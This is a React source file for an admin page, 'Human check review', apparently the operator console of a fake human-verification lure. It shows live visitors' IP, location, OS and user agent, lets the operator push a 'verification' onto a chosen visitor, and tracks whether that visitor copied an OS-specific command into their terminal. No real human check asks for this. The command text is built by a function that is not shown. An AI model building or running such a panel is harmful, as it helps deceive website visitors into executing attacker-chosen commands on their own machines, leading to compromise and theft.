"use client"

import { useCallback, useEffect, useState, type FormEvent } from "react"
import { verificationApi, visitorCommand } from "@/lib/human-verification"

type VerifyStatus = "present" | "opened" | "checked" | "copied" | "code_sent" | "verified"

type AdminSession = {
  id: string
  phrase: string
  status: VerifyStatus
  createdAt: number
  lastSeenAt?: number
  promptedAt?: number
  checkedAt?: number
  copiedAt?: number
  codeSentAt?: number
  verifiedAt?: number
  code: string | null
  attempts: number
  passNumber: number | null
  passCount: number
  ip: string
  location?: string
  os: string
  userAgent: string
  page: string
}

const TOKEN_STORAGE = "apax-admin-token"

const statusLabel: Record<VerifyStatus, string> = {
  present: "Not shown",
  opened: "Shown",
  checked: "Checkbox ticked",
  copied: "Command copied",
  code_sent: "Shown",
  verified: "Passed",
}

function verificationShown(session: AdminSession) {
  return session.status !== "present"
}

function formatTime(value?: number) {
  if (!value) return ""
  const clock = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Etc/GMT-9",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  }).format(new Date(value))
  return `${clock} GMT+9`
}

export default function VerifyAdminPage() {
  const [token, setToken] = useState("")
  const [ready, setReady] = useState(false)
  const [adminId, setAdminId] = useState("")
  const [password, setPassword] = useState("")
  const [signingIn, setSigningIn] = useState(false)
  const [sessions, setSessions] = useState<AdminSession[]>([])
  const [error, setError] = useState("")
  const [notice, setNotice] = useState("")

  useEffect(() => {
    setToken(window.sessionStorage.getItem(TOKEN_STORAGE) || "")
    setReady(true)
  }, [])

  const load = useCallback(async (currentToken: string) => {
    if (!currentToken) return
    const response = await fetch(`${verificationApi()}/verify/admin/sessions`, {
      headers: { "x-admin-token": currentToken },
    })
    const data = await response.json().catch(() => ({}))
    if (response.status === 401) {
      window.sessionStorage.removeItem(TOKEN_STORAGE)
      setToken("")
      setSessions([])
      throw new Error(typeof data.error === "string" ? data.error : "Log in again.")
    }
    if (!response.ok) {
      throw new Error(typeof data.error === "string" ? data.error : "Could not load visitors.")
    }
    setSessions(data.sessions || [])
    setError("")
  }, [])

  useEffect(() => {
    if (!ready || !token) return
    load(token).catch((reason: Error) => setError(reason.message))
    const timer = window.setInterval(() => {
      load(token).catch((reason: Error) => setError(reason.message))
    }, 2000)
    return () => window.clearInterval(timer)
  }, [ready, token, load])

  async function onLogin(event: FormEvent) {
    event.preventDefault()
    setSigningIn(true)
    setError("")
    try {
      const response = await fetch(`${verificationApi()}/verify/admin/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ adminId, password }),
      })
      const data = await response.json().catch(() => ({}))
      if (!response.ok || typeof data.token !== "string") {
        throw new Error(typeof data.error === "string" ? data.error : "Admin ID or password was not accepted.")
      }
      window.sessionStorage.setItem(TOKEN_STORAGE, data.token)
      setToken(data.token)
      setPassword("")
    } catch (reason) {
      setError(reason instanceof Error ? reason.message : "Admin ID or password was not accepted.")
    } finally {
      setSigningIn(false)
    }
  }

  function logout() {
    window.sessionStorage.removeItem(TOKEN_STORAGE)
    setToken("")
    setSessions([])
    setNotice("")
    setError("")
  }

  async function showPage(session: AdminSession) {
    setNotice("")
    setError("")
    const response = await fetch(
      `${verificationApi()}/verify/admin/sessions/${session.id}/show`,
      {
        method: "POST",
        headers: { "x-admin-token": token },
      }
    )
    const data = await response.json().catch(() => ({}))
    if (!response.ok) {
      setError(typeof data.error === "string" ? data.error : "The verification page was not opened.")
      return
    }
    const opened = data.session as AdminSession | undefined
    const openedPhrase = typeof opened?.phrase === "string" ? opened.phrase : session.phrase
    if (opened?.id) {
      setSessions((current) => current.map((item) => (item.id === opened.id ? { ...item, ...opened } : item)))
    }
    setNotice(`Verification page opened. The visitor copies ${visitorCommand(openedPhrase, session.os) || openedPhrase}.`)
    await load(token)
  }

  return (
    <main className="min-h-screen bg-[#0A0A0A] px-6 py-10 text-[#E8E8E8]">
      <div className="mx-auto max-w-3xl">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <p className="text-xs uppercase tracking-[0.18em] text-[#D4AF37]">APAX</p>
            <h1 className="mt-2 font-serif text-3xl text-[#F4E4A6]">Human check review</h1>
          </div>
          {token ? (
            <button
              type="button"
              onClick={logout}
              className="h-10 rounded-md border border-[#3A3A3A] px-4 text-sm text-[#C0C0C0]"
            >
              Log out
            </button>
          ) : null}
        </div>
        <p className="mt-3 max-w-xl text-sm leading-6 text-[#888888]">
          This list is only the browsers connected to the first page right now. Closed visits are
          not kept. Show verification. The visitor copies the command into the terminal for their system.
        </p>
        {error ? <p className="mt-3 text-sm text-[#DC2626]">{error}</p> : null}
        {notice ? <p className="mt-3 text-sm text-[#E6C861]">{notice}</p> : null}

        {!token ? (
          <form onSubmit={onLogin} className="mt-8 max-w-sm space-y-4 rounded-lg border border-[#2A2A2A] bg-[#111111] p-5">
            <div>
              <label className="block text-sm text-[#C0C0C0]" htmlFor="admin-id">Admin ID</label>
              <input
                id="admin-id"
                value={adminId}
                onChange={(event) => setAdminId(event.target.value)}
                autoComplete="username"
                className="mt-2 h-10 w-full rounded-md border border-[#2A2A2A] bg-[#0A0A0A] px-3 outline-none focus:border-[#D4AF37]"
              />
            </div>
            <div>
              <label className="block text-sm text-[#C0C0C0]" htmlFor="admin-password">Password</label>
              <input
                id="admin-password"
                type="password"
                value={password}
                onChange={(event) => setPassword(event.target.value)}
                autoComplete="current-password"
                className="mt-2 h-10 w-full rounded-md border border-[#2A2A2A] bg-[#0A0A0A] px-3 outline-none focus:border-[#D4AF37]"
              />
            </div>
            <button
              type="submit"
              disabled={signingIn || adminId.trim().length === 0 || password.length === 0}
              className="h-10 w-full rounded-md bg-[#D4AF37] text-sm font-medium text-[#0A0A0A] disabled:opacity-40"
            >
              {signingIn ? "Signing in..." : "Log in"}
            </button>
          </form>
        ) : null}

        {token ? <div className="mt-8 space-y-4">
          {sessions.length === 0 ? (
            <p className="rounded-lg border border-[#2A2A2A] bg-[#111111] px-4 py-6 text-sm text-[#888888]">
              No browsers are connected right now.
            </p>
          ) : (
            sessions.map((session) => {
              const shown = verificationShown(session)
              const passed = session.status === "verified"
              return (
              <article
                key={session.id}
                className={`rounded-lg border bg-[#111111] p-4 ${
                  passed ? "border-[#3DDC97]" : shown ? "border-[#E6C861]" : "border-[#2A2A2A]"
                }`}
              >
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <p className="font-mono text-lg tracking-[0.12em] text-[#F4E4A6]">{session.phrase}</p>
                  <span
                    className={`rounded-full px-3 py-1 text-xs font-semibold ${
                      passed
                        ? "bg-[#3DDC97] text-[#0A0A0A]"
                        : shown
                          ? "bg-[#E6C861] text-[#0A0A0A]"
                          : "border border-[#3A3A3A] text-[#888888]"
                    }`}
                  >
                    {passed ? "Passed" : shown ? "Shown" : "Not shown"}
                  </span>
                </div>
                <dl className="mt-4 grid grid-cols-2 gap-x-4 gap-y-3 text-sm">
                  <div>
                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">IP and location</dt>
                    <dd className="mt-1 break-all text-[#E8E8E8]">
                      {session.ip}
                      <span className="mt-1 block text-[#C0C0C0]">{session.location || "Looking up location..."}</span>
                    </dd>
                  </div>
                  <div>
                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">OS</dt>
                    <dd className="mt-1 text-[#E8E8E8]">{session.os || "Unknown"}</dd>
                  </div>
                  <div>
                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Show verification</dt>
                    <dd className={`mt-1 ${shown ? "text-[#E6C861]" : "text-[#888888]"}`}>
                      {shown ? `Pressed ${formatTime(session.promptedAt)}` : "Not pressed"}
                    </dd>
                  </div>
                  <div>
                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Pass number</dt>
                    <dd className="mt-1 font-mono text-[#F4E4A6]">
                      {session.passNumber
                        ? `VP-${String(session.passNumber).padStart(4, "0")}${session.passCount > 1 ? ` · ${session.passCount} passes` : ""}`
                        : "Not passed"}
                    </dd>
                  </div>
                  <div>
                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Arrived</dt>
                    <dd className="mt-1 text-[#E8E8E8]">{formatTime(session.createdAt)} on {session.page}</dd>
                  </div>
                  <div>
                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Command</dt>
                    <dd className="mt-1 whitespace-pre-wrap break-all font-mono text-[#E8E8E8]">{visitorCommand(session.phrase, session.os) || session.phrase}</dd>
                  </div>
                </dl>
                <p className="mt-3 break-all text-xs leading-5 text-[#666666]">{session.userAgent}</p>
                {session.checkedAt || session.copiedAt || session.attempts > 0 ? (
                  <p className="mt-2 text-xs text-[#888888]">
                    {session.checkedAt ? `Checkbox ${formatTime(session.checkedAt)}` : "Checkbox not ticked"}
                    {session.copiedAt ? ` · Copied ${formatTime(session.copiedAt)}` : ""}
                    {session.attempts > 0 ? ` · Wrong attempts ${session.attempts}` : ""}
                  </p>
                ) : null}
                <div className="mt-4 flex flex-wrap items-center gap-3">
                  <button
                    type="button"
                    onClick={() => showPage(session)}
                    className={`h-10 rounded-md px-4 text-sm font-medium ${
                      shown
                        ? "border border-[#E6C861] bg-transparent text-[#E6C861]"
                        : "bg-[#D4AF37] text-[#0A0A0A]"
                    }`}
                  >
                    {shown ? "Show again" : "Show verification"}
                  </button>
                  <span className={`text-sm ${shown ? "text-[#E6C861]" : "text-[#888888]"}`}>
                    {passed
                      ? `Passed ${formatTime(session.verifiedAt)}`
                      : shown
                        ? statusLabel[session.status]
                        : "Waiting for you to open the check"}
                  </span>
                </div>
              </article>
              )
            })
          )}
        </div> : null}
      </div>
    </main>
  )
}
